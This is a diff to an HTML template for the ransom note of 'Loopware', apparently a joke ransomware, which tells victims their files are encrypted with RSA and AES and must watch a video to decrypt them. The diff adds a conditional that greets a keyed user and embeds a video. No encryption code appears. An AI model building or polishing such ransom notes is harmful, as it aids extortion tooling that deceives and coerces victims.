@@ -1,11 +1,17 @@
-<h1 style="text-align: left;">Loopware - {{ uuid }}</h1>
+<h1 style="text-align: left;">Loopware</h1>
 <p style="text-align: left;">All of your files are encrypted with RSA-2048 and AES-128 ciphers.</p>
 <p style="text-align: left;">More information about the RSA and AES can be found here:</p>
 <p>&nbsp;</p>
 <p style="text-align: left;"><a href="https://en.wikipedia.org/wiki/RSA">https://en.wikipedia.org/wiki/RSA</a> (crypto system)</p>
 <p style="text-align: left;"><a href="https://en.wikipedia.org/wiki/Advanced_Encryption_standard">https://en.wikipedia.org/wiki/Advanced_Encryption_standard</a></p>
 <p>&nbsp;</p>
-<p style="text-align: left;">Decrypting of your files is only possible with the following steps</p>
-<p style="text-align: left;">1. Enter your unique id</p>
-<p style="text-align: left;">2. A random video will be displayed to you</p>
-<p style="text-align: left;">3. Watch the full video without skip anything</p>
+
+{{# if key }}
+  <p style="text-align: left;">Welcome user: <strong>{{ key }}</strong></p>
+  <iframe width="560" height="315" src="https://www.youtube.com/embed/0bxNEtkGG7U?rel=0&amp;controls=0&amp;showinfo=0" frameborder="0" allowfullscreen></iframe>
+{{ else }}
+  <p style="text-align: left;">Decrypting of your files is only possible with the following steps</p>
+  <p style="text-align: left;">1. Enter your unique id</p>
+  <p style="text-align: left;">2. A random video will be displayed to you</p>
+  <p style="text-align: left;">3. Watch the full video without skip anything</p>
+{{/ if }}
